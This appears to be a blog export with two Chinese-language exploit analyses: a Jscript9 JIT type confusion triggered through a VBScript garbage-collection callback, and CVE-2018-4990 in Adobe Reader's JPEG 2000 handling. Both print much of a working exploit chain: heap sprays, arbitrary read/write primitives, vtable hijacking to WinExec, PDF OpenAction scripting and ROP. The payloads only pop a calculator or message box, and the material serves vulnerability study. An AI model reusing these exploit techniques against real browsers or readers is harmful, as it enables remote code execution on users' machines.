[{"title":"Jscript9 GC JIT Calc","url":"/Jscript9%20GC%20JIT%20Calc/","content":"<h2 id=\"0x0-概述\"><a href=\"#0x0-概述\" class=\"headerlink\" title=\"0x0 概述\"></a>0x0 概述</h2><p>漏洞样本来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2d1aGUxMjAvYnJvd3Nlci9ibG9iL21hc3Rlci9HQy9qaXRfY2FsYy5odG1s\">yuki chen的github<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>漏洞成因：JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。</p>\n<p>并且在Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制: </p>\n<pre><code>...\narr[1,2,3]\nb = arr[0]\n...\nc = arr[1]\n...\n</code></pre>\n<p>优化后的代码访问arr[0]和arr[1]两个成员时，由于冗余消除机制，只会检查arr对象的类型一次，借此就能通过在JIT代码中触发垃圾回收进而触发回调，在回调中修改arr对象成员的类型实现类型混淆，进而获得完整exploit。</p>\n<blockquote>\n<p>saelo在<span class=\"exturl\" data-url=\"aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2ppdF9leHBsb2l0YXRpb24uaHRtbA==\">The Art of Exploitation<i class=\"fa fa-external-link-alt\"></i></span>中提到了该机制。</p>\n</blockquote>\n<h2 id=\"0x1-漏洞分析\"><a href=\"#0x1-漏洞分析\" class=\"headerlink\" title=\"0x1 漏洞分析\"></a>0x1 漏洞分析</h2><h3 id=\"force-to-optimize\"><a href=\"#force-to-optimize\" class=\"headerlink\" title=\"force to optimize\"></a><strong>force to optimize</strong></h3><p>下方代码的功能为强制触发JIT优化:</p>\n<pre><code>var a = [1, 2, 3];\nstop = true;\n\nfor (var i = 0; i &lt; 10000; ++i)\n    func(a, [&#123;&#125;, &#123;&#125;]);\n</code></pre>\n<p>循环过程中触发JIT优化，优化完成后解释执行函数入口被修改为JIT函数入口，为后续利用做准备。</p>\n<h3 id=\"using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC\"><a href=\"#using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC\" class=\"headerlink\" title=\"using VBScript Class_Terminator to trigger Callback in JavaScript GC\"></a><strong>using VBScript Class_Terminator to trigger Callback in JavaScript GC</strong></h3><p>下方代码在vbscript中创建了类cla0，并且在其Class_Terminate回调中调用了JavaScript中的函数：</p>\n<pre><code>&lt;script type=&quot;text/vbscript&quot;&gt;\n\nDim o\nClass cla0\nPrivate Sub Class_Terminate\n    call ff\nEnd Sub\nEnd Class\n\nSet o = new cla0\n\n&lt;/script&gt;\n</code></pre>\n<p>此处代码作用为：在JavaScript中引用vbscript对象，再消除其引用，使用setTimeout调用函数触发垃圾回收时，最终会执行JavaScript中的ff函数，在其中就可以利用概述中提到的特性进行类型混淆。</p>\n<blockquote>\n<p>使用setTimeout调用函数是为了离开当前作用域以消除当前作用域对vbscript对象的引用，因此此处代码和强制触发JIT优化处为一个作用域，main函数在另一个。</p>\n</blockquote>\n<pre><code>arr.push(o);\no = null;\narr[0] = null;\n\nsetTimeout(main, 1);\n</code></pre>\n<h3 id=\"Type-Confusion\"><a href=\"#Type-Confusion\" class=\"headerlink\" title=\"Type Confusion\"></a><strong>Type Confusion</strong></h3><p>下面是main函数中调用func函数部分代码，与func函数实现:</p>\n<pre><code>var u32 = new Uint32Array(10);\nvar ga = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\nvar fo = new Array(&#123;&#125;, &#123;&#125;, &#123;&#125;);\n\nfunction func(arr, a2) &#123;\n    arr[0] = 1;\n    var bb = &#123; p0: 1, p1: 1, p2: 1, p3: 1,...,p2866: 1 &#125;;//省略了中间的代码\n\n    if (!stop)\n        return;\n\n    a2[1] = ga;\n    a2[2] = fo;\n    arr[0] = arr[1] + 0x38;\n    u32[0] = arr[1];\n    u32[1] = arr[2];\n    arr[1] = 1;\n&#125;\n\nfunction main() &#123;\n    ...\n    ggg = a;\n    for (; i &lt; 0x100000 &amp;&amp; !stop; ++i) &#123;\n        func(a, a);\n    &#125;\n    ...\n&#125;\n</code></pre>\n<p>在强制触发JIT优化时，和main()函数中对func函数的调用区别在于第二参数，之前是[{}, {}]，此次为[1, 2, 3]。</p>\n<p>由于第一次调用时func函数的第二参数为Object数组，JIT生成的汇编代码会直接以Object方式去访问a2的成员。</p>\n<p>不断调用func()函数创建bb对象，在内存耗尽后为bb对象申请内存时，会触发GC以回收未使用的内存。</p>\n<p>GC过程中清理了vbscript对象o，继而执行Class_Terminate调用JavaScript函数ff，其代码如下:</p>\n<pre><code>function ff() &#123;\n    ggg[0] = &#123;&#125;;\n    stop = true;\n&#125;\n</code></pre>\n<p>可以看到在其中将a[0]更改为了object类型，并设置stop为true，这样在此次bb对象申请内存完毕后，就可以绕过检查实现类型混淆。</p>\n<h4 id=\"func函数JIT后的关键代码：\"><a href=\"#func函数JIT后的关键代码：\" class=\"headerlink\" title=\"func函数JIT后的关键代码：\"></a>func函数JIT后的关键代码：</h4><p>首先访问arr[0]，赋值前检查对象类型，此处检查过后，后续就不会再检查其类型是否正确</p>\n<pre><code>1c0d0000    push    ebp\n1c0d0001    mov     ebp, esp\n...\n1c0d005c    mov     esi, dword ptr [ebp+14h]\n1c0d005f    mov     eax, 0\n1c0d0064    test    esi, 1\n1c0d006a    jne     1c0d945a\n1c0d0070    cmovne  esi, esi\n1c0d0073    mov     eax, 0\n1c0d0078    cmp     dword ptr [esi], offset jscript9!Js::JavascriptNativeIntArray::`vftable&#39; (71362358)\n</code></pre>\n<p>接着为bb对象申请所需内存，内存耗尽后触发GC，继而执行ff函数修改了对象a的类型，设置stop为true</p>\n<pre><code>...\n1c0d00be    call    jscript9!Js::JavascriptOperators::NewScObjectMemContext (71432530)\n初始化bb对象...\n</code></pre>\n<p>由于stop被修改，此处代码继续向下执行</p>\n<pre><code>1c0d9220    cmp     eax, 1\n1c0d9223    jmp     1c0d9239\n1c0d9228    cmp     dword ptr [eax], offset jscript9!Js::JavascriptBoolean::`vftable&#39; (71375c54)\n            ; if (!stop) return;\n1c0d922e    jne     1c0d9551\n1c0d9234    cmp     eax, 11E3B670h\n1c0d9239    jne     1c0d9249\n1c0d923f    mov     edi, 11E3BFE0h\n1c0d9244    jmp     1c0d943a\n</code></pre>\n<p>访问a2[1]: 由于在main函数中，调用func函数时两个参数都是a对象，而在GC中调用ff函数后，a[0]（ggg[0]）已经从<strong>JavascriptNativeIntArray</strong>被修改为了<strong>JavascriptArray</strong>，此时就实现了对arr对象的类型混淆。</p>\n<pre><code>...\n1c0d9255    mov     ecx, 0\n1c0d925a    test    bl, 1\n1c0d925d    jne     1c0d9563\n1c0d9263    cmovne  ebx, ebx\n1c0d9266    mov     ecx, 0\n1c0d926b    cmp     dword ptr [ebx], offset jscript9!Js::JavascriptArray::`vftable&#39; (713638c0)\n</code></pre>\n<p>a2[1] = ga: 此处直接将ga对象地址放入了<strong>JavascriptArray</strong>的buffer中，fo对象地址也以同样的方式被放入a2[2]。ga用于伪造DataView，fo用于泄露对象地址。</p>\n<pre><code>...\n1c0d9249    mov     eax, dword ptr ds:[11E36208h]   ;eax: ga address\n1c0d924f    mov     eax, dword ptr [eax+5B4h]\n...\n1c0d9284    mov     ecx, dword ptr [ebx+14h]        ;ebx: a2 address \n1c0d9287    cmp     dword ptr [ecx+4], 1\n1c0d928b    jbe     1c0d958b\n1c0d9291    mov     edx, 1\n1c0d9296    sub     edx, dword ptr [ecx+4]\n1c0d9299    sar     edx, 1Fh\n1c0d929c    lea     ecx, [ecx+14h]\n1c0d929f    and     ecx, edx\n1c0d92a1    mov     dword ptr [ecx], eax\n...\n</code></pre>\n<p>arr[0] = arr[1] + 0x38: 由于类型混淆，arr以int值取出了ga对象地址，并从中取出了ga对象的buffer地址(类型为<strong>JavascriptNativeIntArray</strong>，array buffer位于+38h处)。</p>\n<pre><code>...\n1c0d92db    mov     ecx, 1\n1c0d92e0    sub     ecx, dword ptr [eax+4]\n1c0d92e3    sar     ecx, 1Fh\n1c0d92e6    mov     ebx, dword ptr [eax+14h]\n1c0d92e9    and     ebx, ecx\n1c0d92eb    mov     eax, ebx\n1c0d92ed    add     eax, 38h\n1c0d92f0    jo      1c0d96e3\n1c0d92f6    mov     ecx, dword ptr [esi+14h]        ;esi: arr address\n1c0d92f9    cmp     dword ptr [ecx+4], 0\n1c0d92fd    jbe     1c0d96f2\n1c0d9303    xor     edx, edx\n1c0d9305    sub     edx, dword ptr [ecx+4]\n1c0d9308    sar     edx, 1Fh\n1c0d930b    lea     ecx, [ecx+10h]\n1c0d930e    and     ecx, edx\n1c0d9310    mov     dword ptr [ecx], eax            ;arr[0] = ga address + 0x38\n...\n</code></pre>\n<p>最后将获得的地址放入u32中后返回，其类型为**TypedArray&lt;unsigned int,0&gt;**，方便后续使用。</p>\n<h2 id=\"0x2-利用分析\"><a href=\"#0x2-利用分析\" class=\"headerlink\" title=\"0x2 利用分析\"></a>0x2 利用分析</h2><p>通过类型混淆获得了对象地址后，接下来就是一般的利用流程了。</p>\n<p>在泄露了地址的ga对象buffer中伪造一个DataView对象：</p>\n<pre><code>ga_addr = u32[0];\nfo_addr = u32[1];\n\ndv_addr = ga_addr + 0x38;\n\nga[0] = 0x2e;\nga[1] = dv_addr;\nga[2] = dv_addr - 0x210;\nga[3] = 0;\nga[4] = ga_addr + 0x24;\nga[5] = 0;\nga[6] = -1;\nga[7] = dv_addr;\n</code></pre>\n<p>这里通过封装DataView.prototype.getUint32.call实现了读取任意地址。当前伪造的DataView是没有虚表的，这里通过调用prototype的虚函数（即Js::DataView::EntryGetUint32，上方伪造的DataView成员值是为了绕过该函数中的检查）来绕过对伪造的DataView虚表的访问。</p>\n<pre><code>function read32(addr) &#123;\n    if (addr &gt;= 0x80000000) &#123;\n        addr = -(0x100000000 - addr);\n    &#125;\n    ga[0x1c / 4] = addr;\n    return DataView.prototype.getUint32.call(dv, 0, true);\n\n&#125;\n</code></pre>\n<p>通过类型混淆获得的fo对象地址(类型为<strong>JavascriptArray</strong>，array buffer位于+38h处)和上方实现的任意读实现泄露对象地址，借此从正确的DataView对象中取出Type字段，填充进伪造的DataView对象内。</p>\n<blockquote>\n<p>不修改该字段获取target_arr地址过程中会报错。</p>\n</blockquote>\n<pre><code>function leakObjectAddress(o)\n&#123;\n    fo[0] = o;\n    return readPointer(fo_addr + 0x38);\n&#125;\n\ndv = a[0];\nvar rdv = new DataView(new ArrayBuffer(8));\nvar rtype = readPointer(leakObjectAddress(rdv) + 4);\n\n// Fix fake DataView-&gt;type\nga[0x04 / 4] = rtype;\n\nvar space = new DataView(new ArrayBuffer(0x200));\nvar space_addr = readPointer(leakObjectAddress(space) + 0x1c);\n\nvar fake_vtable_addr = space_addr;\nvar cmd_addr = space_addr + 0x100;\n</code></pre>\n<p>再次泄露一个<strong>JavascriptNativeIntArray</strong>对象地址从其虚表获得jscript9基地址，继而获得Winexec地址。</p>\n<pre><code>var target_arr = new Array(1, 2, 3, 4, 5);\nvar target_arr_addr = leakObjectAddress(target_arr);\njscript9_base = getModuleBase(readPointer(target_arr_addr));\nkernel32_base = getModuleBaseFromIAT(jscript9_base, &#39;KERNEL32&#39;);\n\nvar winexec = getProcAddress(kernel32_base, &#39;WinExec&#39;);\n</code></pre>\n<p>最后修改了target_arr_addr对象的虚表地址，将Winexec函数指针放在伪造虚表的+0x7c处，调用对应虚函数（<strong>Js::JavascriptNativeIntArray::HasItem</strong>）后弹出计算器。</p>\n<pre><code>write32(target_arr_addr, fake_vtable_addr);\nwrite32(fake_vtable_addr + 0x7C, winexec);\n\nwriteString(cmd_addr, &#39;calc&#39;);\n\nif (cmd_addr in target_arr) &#123; &#125;\n</code></pre>\n<h2 id=\"0x3-总结\"><a href=\"#0x3-总结\" class=\"headerlink\" title=\"0x3 总结\"></a>0x3 总结</h2><p>该漏洞是一个逻辑漏洞，因此利用十分稳定，个人觉得可以通过该漏洞入门JIT优化错误类漏洞。</p>\n"},{"title":"CVE-2018-4990 analysis","url":"/cve-2018-4990/","content":"<h2 id=\"0x0-概述\"><a href=\"#0x0-概述\" class=\"headerlink\" title=\"0x0 概述\"></a>0x0 概述</h2><p>漏洞样本来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NtZ29yZWxpay9XaW5kb3dzLVJDRS1leHBsb2l0cy90cmVlL21hc3Rlci9Eb2N1bWVudHMvQWNyb2JhdA==\">github<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n<p>漏洞成因：ARDC在解析JP2K文件（由嵌套的JP2 BOX结构组成）时，处理<strong>jp2h box</strong>中的<strong>cmap box</strong>时，会创建大小由字段长度指定的<strong>cmap对象</strong>。该对象原本作用应该是存放堆块指针，并在使用完毕后遍历释放其中堆块。但是在对其进行遍历时，使用的循环计数却来自<strong>jp2h box</strong>中的<strong>pclr box</strong>+0x2处的byte值，因此在循环释放时就可以通过人工构造导致越界读。<br><img src=\"https://theme-me.github.io/images/jp2k.png\" alt=\"JP2K文件格式\" loading=\"lazy\"></p>\n<p>该漏洞样本中，利用JavaScript实现UAF，继而将越界读变成了<span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9rbG90eGw0MDQvc3RhdHVzLzk5ODc3NzM5MzI2MjE2NjAxNw==\">arbitrary free<i class=\"fa fa-external-link-alt\"></i></span>，最终在关闭沙箱状态下实现任意代码执行。</p>\n<h2 id=\"0x1-漏洞分析\"><a href=\"#0x1-漏洞分析\" class=\"headerlink\" title=\"0x1 漏洞分析\"></a>0x1 漏洞分析</h2><h3 id=\"内存布局\"><a href=\"#内存布局\" class=\"headerlink\" title=\"内存布局\"></a><strong>内存布局</strong></h3><ol>\n<li><p>在pdf中创建一个button（<strong>13 0 obj</strong>）并设置其显示属性为隐藏，将jp2k图像（<strong>23 0 obj</strong>）嵌入在button里。</p>\n<pre><code> 13 0 obj\n &lt;&lt;\n /AP \n &lt;&lt;\n /N 14 0 R\n &gt;&gt;\n /MK \n &lt;&lt;\n /BG [1.0 1.0 1.0]\n /BC [1.0 1.0 1.0]\n /TP 1\n /I 15 0 R\n &gt;&gt;\n /P 4 0 R\n /FT /Btn\n /Ff 65536\n /H /N\n /F 6\n /DA (/AdobeGothicStd-Light 12 Tf 1 1 1 rg)\n /Subtype /Widget\n /Type /Annot\n /Rect [28.203 693.032 30.203 695.032]\n /T (Button1)\n &gt;&gt;\n endobj\n\n 15 0 obj\n &lt;&lt;\n /Resources \n &lt;&lt;\n /XObject \n &lt;&lt;\n /Im0 23 0 R\n &gt;&gt;\n /ProcSet [/PDF /ImageC]\n &gt;&gt;\n /BBox [20.0 20.0 52.0 52.0]\n /Name /FRM\n /Matrix [1.0 0.0 0.0 1.0 -36.0 -36.0]\n /FormType 1\n /Subtype /Form\n /Length 34\n /Type /XObject\n &gt;&gt;\n stream\n ...\n endstream\n endobj\n\n 23 0 obj\n &lt;&lt;\n /Subtype /Image\n /Filter /JPXDecode\n /Length 2123\n /Name /X\n /Width 32\n /Type /XObject\n /Height 32\n &gt;&gt;\n stream\n ...\n endstream\n endobj\n</code></pre>\n</li>\n<li><p>在Root节点中添加OpenAction，使js代码在页面打开时执行。</p>\n<pre><code> trailer\n &lt;&lt;\n /Size 39\n /Root 5 0 R\n &gt;&gt;\n ...\n 5 0 obj\n &lt;&lt;\n /Outlines 2 0 R\n /Pages 3 0 R\n /OpenAction 6 0 R\n /AcroForm 7 0 R\n /Type /Catalog\n &gt;&gt;\n endobj\n ...\n 6 0 obj\n &lt;&lt;\n /JS 1 0 R\n /Type /Action\n /S /JavaScript\n &gt;&gt;\n endobj\n ...\n</code></pre>\n</li>\n<li><p>创建大量大小为0x3F0的Uint32Array对象，在其尾部填充0x0d0e0048、0x0d0f0048后将其释放，该对象在内存中占用0x400字节内存。</p>\n<pre><code> var l1 = 0x3000;\n var a1 = new Array(l1);\n var spraybase = 0x0d0e0048;\n for(var i1=1;i1&lt;l1;i1++)\n &#123;    \n     a1[i1] = new Uint32Array(252);    \n     a1[i1][249] = spraybase;\n     a1[i1][250] = spraybase+0x10000;\n &#125;\n\n for(var i1=1;i1&lt;(l1);i1=i1+2)\n &#123;    \n     delete a1[i1];\n     a1[i1] = null;\n &#125;\n</code></pre>\n</li>\n<li><p>创建大量大小为0xffe8的ArrayBuffer对象进行堆喷，该对象在内存中占用0xfff8字节内存。</p>\n<pre><code> var spraylen  = 0x10000-24;\n var spraynum  = 0x1000;    \n var sprayarr = new Array(spraynum);\n for(var i1=1;i1&lt;spraynum;i1++)\n &#123;    \n     sprayarr[i1] = new Uint32Array(1);                 \n &#125;    \n for(var i1=1;i1&lt;spraynum;i1++)\n &#123;    \n     sprayarr[i1] = new ArrayBuffer(spraylen);                         \n &#125;        \n</code></pre>\n<blockquote>\n<p>当现有Segment中内存不足，需要创建新Segment时，其起始地址形如：0x0b970000。<br>此时在其中分配第一个大小为0xfff8字节的堆块时，0x0b970000处是一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTA0NDktMS5odG0jMTU4NTgwNQ==\">0x40字节大的_HEAP_SEGMENT结构<i class=\"fa fa-external-link-alt\"></i></span>，此后的所有堆块实际占用的内存大小都为0x10000字节（8字节的HEAP_ENTRY结构加上申请的0xfff8字节），因此当申请大量大小为0xfff8字节的内存时，<strong>会创建多个连续且被0xfff8字节大的堆块填满的Segment</strong>，此时Segment中所有+0x48+0x10000*n的偏移都指向了其中一个堆块的起始地址<br>以0x0d0e0048、0x0d0f0048地址所在Segment为例，可以看到连续的Segment，Segment之间的空隙（0c920048和0c940048之间），和被用这种方式占坑了的0x0d0e0048、0x0d0f0048：</p>\n</blockquote>\n<pre><code> 0:000&gt; !heap -a\n Index   Address  Name      Debugging options enabled\n 1:   00370000\n     ...\n     Segment at 0b970000 to 0c940000 (00fc1000 bytes committed)\n     Segment at 0c940000 to 0d910000 (00fc1000 bytes committed)\n     ...\n \n 0:000&gt; !heap -flt s fff8\n     _HEAP @ 370000\n     HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n     ...\n     0c920040 2000 2000  [00]   0c920048    0fff8 - (busy)\n     0c940040 2000 2000  [00]   0c940048    0fff8 - (busy)\n     ...\n     0d0e0040 2000 2000  [00]   0d0e0048    0fff8 - (busy)\n     0d0f0040 2000 2000  [00]   0d0f0048    0fff8 - (busy)\n     ...\n</code></pre>\n</li>\n</ol>\n<h3 id=\"越界读-gt-arbitrary-free\"><a href=\"#越界读-gt-arbitrary-free\" class=\"headerlink\" title=\"越界读 -&gt; arbitrary free\"></a><strong>越界读 -&gt; arbitrary free</strong></h3><ol>\n<li><p>通过下方代码使ARDC调用jp2klib解析其中jp2k图像：</p>\n<pre><code> var f1 = this.getField(&quot;Button1&quot;);\n if(f1)\n &#123;\n     f1.display = display.visible;            \n &#125;\n</code></pre>\n</li>\n<li><p>解析jp2k图像中<strong>jp2h box</strong>中的<strong>cmap box</strong>时为其申请了大小为0x3f4的内存，重用了js中构造后释放的Uint32Array对象中的一个。此时<strong>cmap对象</strong>内存的后方8字节为Uint32Array在末尾处填充的0x0d0e0048、0x0d0f0048堆块指针，经过堆喷后，两者指向两块连续并且大小为0xfff8字节的堆块。</p>\n<pre><code> 0:000&gt; dd 07d24b08 +3f4 l3\n 07d24efc  0d0e0048 0d0f0048 00000000\n</code></pre>\n</li>\n<li><p>遍历释放<strong>cmap对象</strong>中存放的堆块时，由于循环计数被构造为0xff，因此会越界读取8字节(0xff*4 - 0x3f4)，进而释放了0x0d0e0048、0x0d0f0048处内存。释放后触发unlink，两者被合并成一个大小为0x20000的空闲内存，此时在JavaScript中通过创建大小为0x1FFE8的ArrayBuffer来重新占用它，这样<strong>sprayarr</strong>和<strong>sprayarr2</strong>中就有一个对象是重叠的：</p>\n<pre><code> for(var i1=1;i1&lt;0x40;i1++)\n &#123;        \n     sprayarr2[i1] = new ArrayBuffer(0x20000-24);\n &#125;\n</code></pre>\n</li>\n<li><p>在JavaScript中，被JP2KLib释放的堆块指针还保存在<strong>sprayarr</strong>中，并且还具有合法的ArrayBuffer结构，通过遍历<strong>sprayarr</strong>寻找其中长度被修改的成员就可以在js中定位到这个对象（0x0d0e0048）：</p>\n<pre><code> for(var i1=1;i1&lt;spraynum;i1++)\n &#123;        \n     if( sprayarr[i1].byteLength == 0x20000-24)\n     &#123;\n         \n         var biga = new DataView(sprayarr[i1]);        \n</code></pre>\n</li>\n</ol>\n<h3 id=\"arbitrary-free-gt-arbitrary-r-w\"><a href=\"#arbitrary-free-gt-arbitrary-r-w\" class=\"headerlink\" title=\"arbitrary free -&gt; arbitrary r/w\"></a><strong>arbitrary free -&gt; arbitrary r/w</strong></h3><ol>\n<li><p>修改0x0d0f0048处ArrayBuffer对象的长度，再次找到该对象并且创建一个大小为0x66666666的DataView实现0x0d0f0058后的内存的任意地址读写：</p>\n<pre><code> var biga = new DataView(sprayarr[i1]);            \n biga.setUint32(0x10000-12,0x66666666);\n for(var i11=i1;i11&lt;spraynum;i11++)\n &#123;\n     if(sprayarr[i11].byteLength == 0x66666666)\n     &#123;\n         i1 = i11;\n         biga = new DataView(sprayarr[i1]);\n         break;\n     &#125;\n &#125;\n</code></pre>\n</li>\n<li><p>利用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTA0NDkuaHRtI21zZ19oZWFkZXJfaDNfMQ==\">Uint32Array的Buffer中会保存Uint32Array的对象地址的特征<i class=\"fa fa-external-link-alt\"></i></span>，将sprayarr中的Buffer作为新创建的Uint32Array的Buffer，为泄露对象地址做准备：</p>\n<pre><code> var arr1 = new Array(0x10000);\n\n for(var i2=0x10;i2&lt;0x10000;i2++)\n     arr1[i2] = new Uint32Array(1);\n for(var i2 = 1;i2&lt;0x10;i2++)\n &#123;\n     arr1[i2] = new Uint32Array(sprayarr[i1+i2]);\n     arr1[i2][0] = i2;\n &#125;\n</code></pre>\n<p> 这会导致下方内存布局：</p>\n<pre><code> 0:010&gt; dd 1ae98030 l58/4\n 1ae98030  051b2b68 05125c00 00000000 66cb8cb8\n 1ae98040  00000000 00000000 00000000 ffffff81\n 1ae98050  0000ffe8 ffffff81 072e9c70 ffffff87\n 1ae98060  00000000 00000000 00000002 00000000\n 1ae98070  00003ffa ffffff81 00000005 ffffff81\n 1ae98080  0d100058 00000000\n\n 0:010&gt; dd 0d100058 -10 l8\n 0d100048  00000000 0000ffe8 1ae98030 00000000\n 0d100058  00000001 00000000 00000000 00000000\n</code></pre>\n</li>\n<li><p>在内存中寻找上方对象，并通过已知的DataView对象地址得到泄露的Uint32Array对象地址，找到后修改Uint32Array对象的length为0x100000</p>\n<pre><code> if( biga.getUint32(i2,true)==spraylen &amp;&amp; biga.getUint32(i2+4,true) &gt; spraypos  )\n &#123;\n     mydv = biga;\n     var itmp = mydv.getUint32(i2+12,true);        \n     //app.alert(i2.toString(16));                    \n     myarray = arr1[itmp];                                \n     mypos = biga.getUint32(i2+4,true) - spraypos +0x50;\n     mydv.setUint32(mypos-0x10,0x100000,true);\n     myarraybase = mydv.getUint32(mypos,true);\n     ...\n</code></pre>\n<p> 此时的myarray对象：</p>\n<pre><code> 0:003&gt; dd 1ae98138 l58/4\n 1ae98138  051b2b68 05125c00 00000000 66cb8cb8\n 1ae98148  00000000 00000000 00000000 ffffff81\n 1ae98158  0000ffe8 ffffff81 072e9e38 ffffff87\n 1ae98168  00000000 00000000 00000002 00000000\n 1ae98178  00100000 ffffff81 00000005 ffffff81\n 1ae98188  0d130058 00000000\n\n 0:010&gt; dd 0d130058 -10 l8\n 0d130048  00000000 0000ffe8 1ae98138 00000000\n 0d130058  00000004 00000000 00000000 00000000\n</code></pre>\n</li>\n<li><p>使用泄露了地址的Uint32Array对象和超长DataView对象封装任意地址读写原语：</p>\n<p> <strong>mypos</strong>: myarray.buffer在DataView中的偏移, 此时为: 1ae98188 - 0d0f0058 = dda8130<br> <strong>myarraybase</strong>: myarray.buffer的地址, 此时为: 0d130058</p>\n<pre><code> function myread(addr)\n &#123;\n     mydv.setUint32(mypos,addr,true);\n     var res = myarray[0];\n     mydv.setUint32(mypos,myarraybase,true);\n     return res;\n &#125;\n function mywrite(addr,value)\n &#123;\n     mydv.setUint32(mypos,addr,true);\n     myarray[0] = value ;\n     mydv.setUint32(mypos,myarraybase,true);\n &#125;\n</code></pre>\n</li>\n</ol>\n<h3 id=\"信息泄露，ROP\"><a href=\"#信息泄露，ROP\" class=\"headerlink\" title=\"信息泄露，ROP\"></a><strong>信息泄露，ROP</strong></h3><p>通过任意地址读写泄露Uint32Array对象虚表地址，进而通过内存对齐得到Escript基址。</p>\n<pre><code>var obj1 = myread(myarraybase-8);\nvar obj2 = myread(obj1+4);\nvar dll_base= (myread(obj2)-0x00010000 )&amp;0xffff0000;\nwhile (myread(dll_base+0x6c)!=0x20534f44)&#123;\n    dll_base-=0x00010000;\n&#125;\n</code></pre>\n<p>最终通过硬编码的bookmarkRoot地址覆盖其虚函数，调用对应函数跳转至ROP。</p>\n<pre><code>var objescript = offset(&quot;bookmarkRoot&quot;) + dll_base;\nobjescript = myread(objescript);    \n//app.alert(objescript.toString(16));\nfor(var i2=0;i2&lt; rop1.length ;i2=i2+1)\n&#123;\nmyarray[i2+3] = rop1[i2] &gt;  0x640c0000 ?(rop1[i2] - 0x640c0000 +dll_base):rop1[i2];\n&#125;\nmyarray[i2+3-2] = 0x90909090;\nfor(var i3=0;i3&lt; dlldata.length ;i3=i3+1)\n&#123;\nmyarray[i2+3+i3] = dlldata[i3];\n&#125;\n\nmywrite(objescript, offset(&quot;sp2&quot;)-0x640c0000+dll_base);\nmywrite(objescript+4,myarraybase);\nmywrite(objescript+0x598,offset(&quot;sp1&quot;)-0x640c0000+dll_base);\napp.alert(&quot;HaHa, this will trigger the ROP&quot;);\n</code></pre>\n<h2 id=\"0x2-利用分析\"><a href=\"#0x2-利用分析\" class=\"headerlink\" title=\"0x2 利用分析\"></a>0x2 利用分析</h2><p>ROP的功能很简单，就是通过rop调用VirtualProtect执行dlldata中硬编码的shellcode，shellcode功能为调用MessageBox，具体分析参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm1vcnBoaXNlYy5jb20vY3JpdGljYWwtYWxlcnQtY3ZlLTIwMTgtNDk5MC1hY3JvYmF0LXJlYWRlci1kYy1kb3VibGUtZnJlZS12dWxuZXJhYmlsaXR5\">这篇文章<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n<p>调试时没有使用对应的版本，因此跟着文章构造了一遍ROP，最终弹出MessageBox的截图：<br><img src=\"https://theme-me.github.io/images/2018-4990.png\" alt=\"MessageBox\" loading=\"lazy\"></p>\n<h2 id=\"0x3-总结\"><a href=\"#0x3-总结\" class=\"headerlink\" title=\"0x3 总结\"></a>0x3 总结</h2><p>这个洞的分析文章比较多，所有的关键点都被分析清楚了。并且这时候的ARDC还没有开CFG，用来学习写利用很方便。</p>\n"},{"title":"404","url":"//404.html","content":"<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">██╗  ██╗ ██████╗ ██╗  ██╗    ███╗   ██╗ ██████╗ ████████╗</span><br><span class=\"line\">██║  ██║██╔═████╗██║  ██║    ████╗  ██║██╔═══██╗╚══██╔══╝</span><br><span class=\"line\">███████║██║██╔██║███████║    ██╔██╗ ██║██║   ██║   ██║</span><br><span class=\"line\">╚════██║████╔╝██║╚════██║    ██║╚██╗██║██║   ██║   ██║</span><br><span class=\"line\">     ██║╚██████╔╝     ██║    ██║ ╚████║╚██████╔╝   ██║</span><br><span class=\"line\">     ╚═╝ ╚═════╝      ╚═╝    ╚═╝  ╚═══╝ ╚═════╝    ╚═╝</span><br><span class=\"line\"></span><br><span class=\"line\">    ███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗</span><br><span class=\"line\">    ██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗</span><br><span class=\"line\">    █████╗  ██║   ██║██║   ██║██╔██╗ ██║██║  ██║</span><br><span class=\"line\">    ██╔══╝  ██║   ██║██║   ██║██║╚██╗██║██║  ██║</span><br><span class=\"line\">    ██║     ╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝</span><br><span class=\"line\">    ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝</span><br></pre></td></tr></table></figure>\n"}]